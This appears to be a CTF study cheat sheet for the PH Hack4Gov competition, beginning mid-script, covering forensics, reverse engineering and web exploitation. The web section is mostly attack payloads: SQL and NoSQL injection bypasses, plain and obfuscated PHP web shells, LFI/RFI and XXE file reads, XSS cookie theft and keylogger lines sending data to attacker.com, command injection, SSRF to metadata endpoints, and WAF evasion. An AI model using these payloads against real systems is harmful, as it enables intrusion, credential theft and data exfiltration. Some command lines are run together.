echo "[+] Running initial analysis..."
file $1
echo "[+] Extracting strings..."
strings $1 > strings.txt
echo "[+] Running binwalk..."
binwalk -e $1
echo "[+] Running foremost..."
foremost -i $1 -o foremost_out
echo "[+] Checking for steganography..."
steghide extract -sf $1 2>/dev/null
echo "[+] Analysis complete!"
```

## 12. Additional Resources

### Online Tools

- [CyberChef](https://gchq.github.io/CyberChef/) - Data manipulation
- [VirusTotal](https://www.virustotal.com) - Malware analysis
- [Hybrid Analysis](https://www.hybrid-analysis.com) - Sandbox
- [RegexPal](https://www.regexpal.com) - Regex testing

### Documentation

- Volatility Command Reference
- SANS DFIR Cheat Sheets
- Forensics Wiki
- CTF Field Guide

---

**Remember:** In CTFs, always think outside the box. If something seems too complex, there might be a simpler solution. Good luck with PH Hack4Gov! 🇵🇭

---

# Reverse Engineering

## PH Hack4Gov Edition

---

## 🎯 Introduction & Mindset

Reverse Engineering is the art of analyzing code to understand its inner workings without access to source code. In CTF competitions, the goal is simple: **GET THE FLAG**. Perfect understanding isn't required - just enough to extract what you need.

### Key Principles:

- **Efficiency over perfection**: Don't reverse more than necessary
- **Pattern recognition**: Flags often follow formats like `flag{...}`, `CTF{...}`, `H4G{...}`
- **Time management**: Try quick wins before deep analysis
- **Tool mastery**: Know your tools well enough to be fast

---

## 📋 Universal First Steps

### Initial Reconnaissance

1. **File identification**
    
    ```bash
    file <filename>           # Identify file type
    xxd <filename> | head     # Check file headers manually
    binwalk <filename>        # Check for embedded files
    exiftool <filename>       # Extract metadata
    ```
    
2. **String analysis**
    
    ```bash
    strings <filename>                    # All strings
    strings -n 8 <filename>              # Minimum 8 characters
    strings <filename> | grep -i flag    # Search for flag patterns
    strings <filename> | grep -E "CTF|FLAG|flag|h4g|H4G"
    rabin2 -z <filename>                 # Alternative string extraction
    ```
    
3. **Entropy analysis**
    
    ```bash
    ent <filename>           # Check randomness (might indicate encryption/packing)
    binwalk -E <filename>    # Entropy graph
    ```
    

---

## 🔧 PE Files (.exe, .dll) - Windows Executables

### Static Analysis Tools

- **File Analysis**: DIE (Detect It Easy), PEiD, PEBear, PEView, CFF Explorer
- **Hex Editors**: HxD, 010 Editor, ImHex
- **Disassemblers**: IDA Pro/Free, Radare2, Binary Ninja
- **Decompilers**: Ghidra, Snowman, IDA Hex-Rays, RetDec

### Dynamic Analysis Tools

- **Debuggers**: x64dbg/x32dbg, OllyDbg, WinDbg, Immunity Debugger
- **API Monitoring**: API Monitor, WinAPIOverride, Rohitab API Monitor
- **Tracing**: Frida, Intel Pin, DynamoRIO

### Advanced PE Analysis

#### Packing Detection & Unpacking

```bash
# Common packers: UPX, Themida, VMProtect, ASPack, PECompact
upx -d <filename>         # UPX unpacking
# For other packers, use:
# - Scylla for import reconstruction
# - x64dbg with ScyllaHide plugin
# - Manual unpacking at OEP (Original Entry Point)
```

#### Anti-Debug Detection & Bypass

Common anti-debug techniques:

- `IsDebuggerPresent()` API check
- `CheckRemoteDebuggerPresent()`
- PEB.BeingDebugged flag check
- Timing checks (`GetTickCount`, `rdtsc`)
- Exception-based detection

Bypass methods:

- ScyllaHide plugin for x64dbg
- Modify PEB manually
- Hook/patch API calls
- Use kernel debugger (WinDbg)

#### Import Address Table (IAT) Analysis

```bash
# Check imports for interesting functions
dumpbin /imports <filename>    # Windows SDK tool
rabin2 -i <filename>           # Radare2
```

---

## 🐧 ELF Files (Linux Executables)

### Static Analysis

```bash
# File information
readelf -a <filename>          # Complete ELF analysis
objdump -d <filename>          # Disassembly
objdump -M intel -d <filename> # Intel syntax
nm <filename>                  # Symbol table
ldd <filename>                 # Shared library dependencies
checksec <filename>            # Security features check
```

### Dynamic Analysis

```bash
# Tracing
ltrace ./<filename>            # Library call trace
strace ./<filename>            # System call trace
strace -f -e trace=all ./<filename>  # Follow forks

# Debugging with GDB + Extensions
gdb ./<filename>
# Install one: peda, pwndbg, or gef
# pwndbg recommended for CTF
```

### Advanced ELF Techniques

#### Patching Binaries

```bash
# Using radare2
r2 -w <filename>
# In r2: s <address>; wx <hex_bytes>

# Using patchelf
patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2 <filename>
patchelf --add-needed libexample.so <filename>
```

#### Dealing with Stripped Binaries

- Use string references to identify functions
- Look for syscall patterns
- Use function prologue/epilogue signatures
- Leverage dynamic analysis more heavily

---

## 📱 Android APK Files

### Decompilation & Analysis

```bash
# Decompile to smali
apktool d <filename.apk>

# Convert to Java
d2j-dex2jar <filename.apk>
# Then open with jd-gui or JADX

# One-stop solution
jadx <filename.apk>           # Best for most cases
jadx-gui <filename.apk>        # GUI version

# Quick inspection
unzip <filename.apk>           # APKs are zip files
```

### Dynamic Analysis

- **Android Studio Emulator** with root access
- **Genymotion** for faster emulation
- **Android Debug Bridge (ADB)**:
    
    ```bash
    adb devices                 # List devicesadb logcat                  # View logsadb shell                   # Shell accessadb pull/push              # File transfer
    ```
    

### Frida for Android

```bash
# Install frida-server on device
frida-ps -U                  # List processes
frida -U -f com.package.name # Spawn and attach
frida-trace -U -i "open*" com.package.name
```

---

## 🔷 .NET Files (.exe, .dll)

### Primary Tool: dnSpy

- **Decompilation**: Full C# source recovery
- **Debugging**: Step through decompiled code
- **Editing**: Modify and recompile
    - Right-click method → Edit Method (C#)
    - Compile → File → Save Module

### Alternative Tools

- **ILSpy**: Lightweight decompiler
- **dotPeek**: JetBrains decompiler
- **de4dot**: .NET deobfuscator
    
    ```bash
    de4dot <obfuscated.exe>
    ```
    

### .NET Core/5+ Analysis

- Extract single-file executables:
    
    ```bash
    dotnet-dump collect -p <pid>dotnet-dump analyze <dump_file>
    ```
    

---

## ☕ Java Files (.jar, .class)

### Decompilation

```bash
# For .class files
javap -c <classfile>         # Bytecode
javap -verbose <classfile>   # Detailed info

# For .jar files
jar xf <filename.jar>        # Extract
```

### GUI Decompilers

- **JADX**: Best overall, handles both Java and Android
- **JD-GUI**: Classic Java decompiler
- **Fernflower**: IntelliJ IDEA's decompiler
- **CFR**: Good for modern Java features
- **Procyon**: Handles Java 8+ features well

---

## 🐍 Python Files (.py, .pyc, .pyo, .exe)

### Decompilation

```bash
# For .pyc files
uncompyle6 <filename.pyc>
pycdc <filename.pyc>         # Alternative
decompyle3 <filename.pyc>    # Python 3.7+

# For Python EXE
python pyinstxtractor.py <filename.exe>
# Creates <filename.exe_extracted> folder
# Look for .pyc files inside
```

### Bytecode Analysis

```python
import dis
import marshal

with open('file.pyc', 'rb') as f:
    f.seek(16)  # Skip pyc header (varies by version)
    code = marshal.load(f)
    dis.dis(code)
```

### Obfuscation Handling

- **pyarmor**: Look for `_pytransform.dll`
- **pyobfuscate**: Pattern-based deobfuscation
- Manual deobfuscation through dynamic analysis

---

## 🛡️ Advanced Techniques

### Shellcode Analysis

```bash
# Tools
scdbg -f shellcode.bin       # Emulate shellcode
shellcode2exe shellcode.bin  # Convert to PE

# Manual analysis
echo -ne "\x31\xc0\x50..." | ndisasm -b32 -
echo -ne "\x31\xc0\x50..." | ndisasm -b64 -
```

### Cryptographic Challenges

1. **Identify the algorithm**:
    
    - Look for magic constants (MD5, SHA, AES)
    - Check for S-boxes, round functions
    - Identify key sizes and IV usage
2. **Common weaknesses**:
    
    - Hardcoded keys/IVs
    - Weak random number generation
    - Known plaintext attacks
    - Side-channel leaks in implementation

### Anti-Analysis Techniques

#### VM-based Protection

- **VMProtect**, **Themida**, **Code Virtualizer**
- Approach: Focus on I/O operations rather than logic
- Tools: VMAttack, VTIL

#### Control Flow Flattening

- Identify dispatcher blocks
- Reconstruct original flow through tracing
- Use symbolic execution (angr, Triton)

---

## 🚀 CTF-Specific Tips

### Quick Win Strategies

1. **Check for low-hanging fruit**:
    
    ```bash
    strings binary | grep -E "flag{.*}"
    ltrace ./binary 2>&1 | grep flag
    strace -s 1000 ./binary 2>&1 | grep flag
    ```
    
2. **Common flag locations**:
    
    - Command-line arguments
    - Environment variables
    - File operations (check what files are read/written)
    - Network communications
    - Memory at specific addresses
3. **Timing/Side-channel attacks**:
    
    - Password check byte-by-byte
    - Timing differences in comparison
    - Resource usage patterns

### Automation & Scripting

#### Angr Template

```python
import angr
import claripy

proj = angr.Project('./binary')
flag_length = 20
flag = claripy.BVS('flag', flag_length * 8)

state = proj.factory.entry_state(stdin=flag)
for byte in flag.chop(8):
    state.solver.add(byte >= 0x20)
    state.solver.add(byte <= 0x7e)

simgr = proj.factory.simulation_manager(state)
simgr.explore(find=0xGOOD_ADDR, avoid=0xBAD_ADDR)

if simgr.found:
    print(simgr.found[0].posix.dumps(0))
```

#### Z3 Solver Template

```python
from z3 import *

flag = [BitVec(f'flag_{i}', 8) for i in range(20)]
s = Solver()

# Add constraints
for f in flag:
    s.add(f >= 0x20, f <= 0x7e)

# Add challenge-specific constraints
# s.add(flag[0] ^ flag[1] == 0x42)

if s.check() == sat:
    m = s.model()
    print(''.join(chr(m[f].as_long()) for f in flag))
```

---

## 📚 Online Resources & Decompilers

### Web-Based Decompilers

- **Decompiler.com**: Multiple languages support
- **RetDec Online**: retdec.com
- **Compiler Explorer**: godbolt.org (understand compiler output)
- **OnlineGDB**: Online debugging for multiple languages

### CTF-Specific Resources

- **GTFOBins**: Living off the land binaries
- **CyberChef**: Data transformation toolkit
- **factordb.com**: Large number factorization
- **dCode.fr**: Classical cipher tools

### Philippine Hack4Gov Specific

- Be aware of local flag formats (might use Filipino words/references)
- Common themes: government, cybersecurity awareness, local culture
- Check for steganography in images with Filipino landmarks
- Consider timezone-based challenges (PHT/GMT+8)

---

## 🎓 Learning Path Recommendations

### Beginner

1. Start with Python/Java reversing (higher level)
2. Learn basic assembly (x86/x64)
3. Practice with crackmes.one
4. Solve easy RE challenges on PicoCTF

### Intermediate

1. Master GDB/x64dbg
2. Learn about packers and protectors
3. Understand crypto implementations
4. Practice on HackTheBox RE challenges

### Advanced

1. Symbolic execution (angr, manticore)
2. Emulation frameworks (Unicorn, QEMU)
3. Vulnerability research techniques
4. Custom tool development

---

## 🏁 Final CTF Strategy

1. **Triage** (2 minutes):
    
    - File type identification
    - Strings check
    - Basic execution test
2. **Quick attempts** (10 minutes):
    
    - Common passwords/inputs
    - Environment manipulation
    - Basic patching
3. **Deep dive** (if needed):
    
    - Full static analysis
    - Debugging session
    - Scripting/automation

Remember: In CTF, the goal is the flag, not perfect understanding. Be pragmatic, use shortcuts, and move on if stuck too long. Good luck with PH Hack4Gov!

---

_"The best reverse engineer is a lazy reverse engineer - automate everything you can!"_

---

# Web Exploitation

## Initial Web Enumeration

### Banner Grabbing & Service Identification

```bash
# Basic service identification
nc -nv <IP> 80
HEAD / HTTP/1.0

# Detailed version scanning
nmap -sV -sC -p80,443,8080,8443 <IP>
whatweb http://<IP>

# Technology stack identification
wappalyzer (browser extension)
builtwith.com
```

### Web Application Scanning

#### Nikto - Comprehensive Web Scanner

```bash
nikto -h http://10.10.10.10 -output scan.txt
nikto -h https://10.10.10.10 -ssl -output ssl_scan.txt
nikto -h http://10.10.10.10 -Tuning x # Reverse tuning (include all except specified)
```

#### Directory & File Enumeration

**Gobuster (Fast)**

```bash
# Directory bruteforce
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50

# DNS subdomain bruteforce
gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt

# Virtual host discovery
gobuster vhost -u http://<IP> -w /usr/share/wordlists/subdomains.txt
```

**Feroxbuster (Recursive)**

```bash
feroxbuster -u http://<IP> -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,js,asp,aspx -r
```

**FFUF (Flexible)**

```bash
# Directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ

# Parameter fuzzing
ffuf -w params.txt -u http://<IP>/index.php?FUZZ=test -mc 200

# POST data fuzzing
ffuf -w users.txt:USER -w pass.txt:PASS -X POST -d "username=USER&password=PASS" -u http://<IP>/login.php
```

### SSL/TLS Testing

```bash
# SSL vulnerabilities
sslscan <IP>:443
sslyze --regular <IP>:443
testssl.sh https://<IP>

# Heartbleed specific
nmap -p 443 --script ssl-heartbleed <IP>
```

### Source Code Analysis Checklist

- [ ] HTML comments `<!-- -->`
- [ ] JavaScript variables and functions
- [ ] Hidden form fields
- [ ] Debug/test parameters
- [ ] API endpoints in JS files
- [ ] Hardcoded credentials
- [ ] Base64 encoded strings
- [ ] JWT tokens in localStorage/cookies
- [ ] `.git`, `.svn`, `.DS_Store` files

## CMS-Specific Exploitation

### WordPress

```bash
# Enumeration
wpscan --url http://<IP> --enumerate ap,at,u,m --api-token YOUR_TOKEN

# Aggressive plugin detection
wpscan --url http://<IP> --enumerate p --plugins-detection aggressive

# Bruteforce
wpscan --url http://<IP> -U admin -P /usr/share/wordlists/rockyou.txt

# Important files
/wp-config.php.bak
/wp-content/uploads/
/.wp-config.php.swp
/wp-content/debug.log
```

### Joomla

```bash
# Version detection
curl -s http://<IP>/administrator/manifests/files/joomla.xml | grep '<version>'

# Scanner
joomscan -u http://<IP>

# Important paths
/administrator/
/configuration.php.bak
/htaccess.txt
/web.config.txt
```

### Drupal

```bash
# Enumeration
droopescan scan drupal -u http://<IP>

# Version identification
/CHANGELOG.txt
/core/CHANGELOG.txt
/includes/bootstrap.inc

# Drupalgeddon exploits
searchsploit drupalgeddon
```

## Authentication Bypass Techniques

### SQL Injection Login Bypass

```sql
-- Common payloads
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
' or 1=1 or ''='
admin' or '1'='1'--
admin') or ('1'='1'--

-- PostgreSQL specific
admin'--
admin' AND 1=1--

-- MySQL specific
admin' #
admin' -- 
' OR '1
```

### NoSQL Injection

```javascript
// MongoDB bypass
username[$ne]=admin&password[$ne]=admin
username=admin&password[$regex]=^.{1}

// JSON payloads
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

## Advanced SQL Injection

### Manual Testing Methodology

```sql
-- 1. Test for injection
'
"
')
")

-- 2. Identify number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (Continue until error)

-- 3. Find injectable columns
' UNION SELECT 1,2,3--
' UNION SELECT null,null,null--

-- 4. Database enumeration
' UNION SELECT database(),user(),version()--
' UNION SELECT schema_name,null,null FROM information_schema.schemata--
' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema='database_name'--
' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users'--

-- 5. Data extraction
' UNION SELECT username,password,null FROM users--
```

### SQLMap Advanced Usage

```bash
# With cookie/session
sqlmap -u "http://<IP>/page.php?id=1" --cookie="PHPSESSID=abc123"

# POST request from file
sqlmap -r request.txt --level=5 --risk=3

# Specific injection techniques
sqlmap -u "http://<IP>/page.php?id=1" --technique=U

# Database dump
sqlmap -u "http://<IP>/page.php?id=1" -D database_name -T table_name --dump

# OS shell
sqlmap -u "http://<IP>/page.php?id=1" --os-shell

# WAF bypass
sqlmap -u "http://<IP>/page.php?id=1" --tamper=space2comment,between
```

## File Upload Exploitation

### Bypass Techniques

**Extension Manipulation**

```
shell.php.jpg
shell.php.png
shell.php%00.jpg
shell.php\x00.jpg
shell.php;.jpg
shell.php%20
shell.php%0a
shell.php.
shell.pHp
shell.PHP5
shell.phtml
shell.pht
```

**Content-Type Bypass**

```http
Content-Type: image/jpeg
Content-Type: image/gif
Content-Type: image/png
```

**Magic Bytes**

```bash
# Add magic bytes to PHP shell
echo -e "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system(\$_GET['cmd']); ?>" > shell.png
echo "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.gif
echo -e "\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>" > shell.jpg
```

**Polyglot Files**

```bash
# Create polyglot JPG/PHP
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

### Web Shells

**Minimal PHP Shell**

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
```

**Obfuscated PHP Shell**

```php
<?php $a=base64_decode('c3lzdGVt');$a($_GET['x']); ?>
<?php ${"GLOBALS"}["x"]($_POST["y"]); ?>
<?php @assert($_REQUEST['x']); ?>
```

## Local File Inclusion (LFI)

### Basic LFI Payloads

```
../../../../../../etc/passwd
../../../../../../etc/passwd%00
../../../../../../etc/passwd?.jpg
....//....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd
```

### PHP Wrappers

```
# Base64 encode for source code reading
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php

# Remote code execution
php://input (POST: <?php system('id'); ?>)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Read files
file:///etc/passwd
expect://id
```

### LFI to RCE

```
# Log poisoning
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/mail.log
/proc/self/environ

# Session poisoning
/var/lib/php/sessions/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]

# Upload + LFI
/var/tmp/[uploaded_file]
/tmp/[uploaded_file]
```

## Remote File Inclusion (RFI)

### Testing for RFI

```
http://vulnerable.com/page.php?file=http://attacker.com/shell.txt
http://vulnerable.com/page.php?file=http://attacker.com/shell.txt%00
http://vulnerable.com/page.php?file=http://attacker.com/shell.txt?
http://vulnerable.com/page.php?file=\\attacker.com\share\shell.txt
```

### Hosting Malicious Files

```bash
# Python HTTP server
python3 -m http.server 80

# PHP server
php -S 0.0.0.0:80

# SimpleHTTPServer with upload
python -m uploadserver 80
```

## XML External Entity (XXE) Injection

### Basic XXE Payloads

```xml
<!-- File disclosure -->
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>

<!-- SSRF through XXE -->
<!DOCTYPE data [
<!ENTITY ssrf SYSTEM "http://internal-server/admin">
]>
<data>&ssrf;</data>

<!-- Blind XXE with DTD -->
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
%send;
]>
```

### XXE in Different Formats

```xml
<!-- SVG XXE -->
<svg xmlns="http://www.w3.org/2000/svg">
<rect width="500" height="500" style="fill:rgb(0,0,255);stroke-width:1;stroke:rgb(0,0,0)">
<animate attributeName="fill" values="red;blue;green" dur="10s" repeatCount="indefinite"/>
</rect>
<text x="10" y="20">
<tspan>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>&file;</tspan>
</text>
</svg>
```

## OS Command Injection

### Detection Payloads

```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
; sleep 10
| sleep 10
& ping -c 10 127.0.0.1
```

### Bypass Techniques

```bash
# Space bypass
{cat,/etc/passwd}
cat</etc/passwd
cat<>/etc/passwd
IFS=,;`cat<<<$IFS/etc/passwd`

# Blacklist bypass
c''at /etc/passwd
c\at /etc/passwd
c$@at /etc/passwd
/bin/c??/e??/p??s??
```

## Cross-Site Scripting (XSS)

### XSS Payloads

```javascript
// Basic
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Cookie theft
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">

// Keylogger
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key=' + e.key);
}
</script>

// Filter bypass
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert`1`>
<svg/onload=alert(/XSS/)>
```

### XSS Filter Evasion

```javascript
// Without parentheses
<img src=x onerror=alert`1`>
<img src=x onerror=alert.bind\x28null,1\x29>

// Without script tags
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>

// Encoding bypass
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
```

## Server-Side Request Forgery (SSRF)

### SSRF Payloads

```
http://127.0.0.1:80
http://localhost:80
http://[::1]:80
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/

# Bypass filters
http://127.1/
http://0177.0.0.1/
http://0x7f.0.0.1/
http://2130706433/
```

## Web Application Firewall (WAF) Bypass

### WAF Detection

```bash
wafw00f http://target.com
nmap --script http-waf-detect,http-waf-fingerprint -p80,443 target.com
```

### Common Bypass Techniques

```sql
-- SQL Injection WAF bypass
SELECT/**/*/**/FROM/**/*/**/users
SELECT%09*%09FROM%09users
SELECT DISTINCT%0A*%0AFROM%0Ausers
/*!SELECT*/ * /*!FROM*/ users
```

## Useful Wordlists & Resources

### Wordlist Locations

```
/usr/share/wordlists/
/usr/share/seclists/
/usr/share/dirb/wordlists/
/usr/share/dirbuster/wordlists/
```

### Custom Wordlist Generation

```bash
# From website
cewl http://target.com -d 2 -w wordlist.txt

# Mutation
john --wordlist=wordlist.txt --rules --stdout > mutated.txt

# Common extensions for CTF
.php,.php3,.php4,.php5,.phtml,.txt,.html,.htm,.jsp,.asp,.aspx
.js,.css,.xml,.json,.config,.bak,.backup,.old,.~,.swp,.git
.zip,.tar,.gz,.rar,.log,.sql,.db,.sqlite
```

## Quick Exploitation Checklist for CTF

1. **[Unverified]** Check robots.txt, sitemap.xml, security.txt
2. **[Unverified]** View source for comments and hidden fields
3. **[Unverified]** Check for common backups (.bak, .old, .swp, ~)
4. **[Unverified]** Test for directory traversal on all parameters
5. **[Unverified]** Check for SQL injection on all inputs
6. **[Unverified]** Look for file upload vulnerabilities
7. **[Unverified]** Test for command injection
8. **[Unverified]** Check cookies and sessions for manipulation
9. **[Unverified]** Look for API endpoints and test them
10. **[Unverified]** Check for IDOR vulnerabilities

## PHP-Specific Vulnerabilities for CTF

### Type Juggling

```php
// Vulnerable comparison
if ($_POST['password'] == $stored_password)

// Bypass with: password[]=anything
```

### PHP Object Injection

```php
// Look for unserialize() calls
// Create malicious serialized objects
O:8:"Example":1:{s:4:"file";s:11:"/etc/passwd";}
```

### Include/Require Vulnerabilities

```php
// Look for:
include($_GET['page']);
require_once($_GET['file'].'.php');
```

> **Note**: [Unverified] This cheatsheet contains common techniques and tools for CTF web challenges. Always verify tool availability and test payloads in the specific CTF environment as behavior may vary.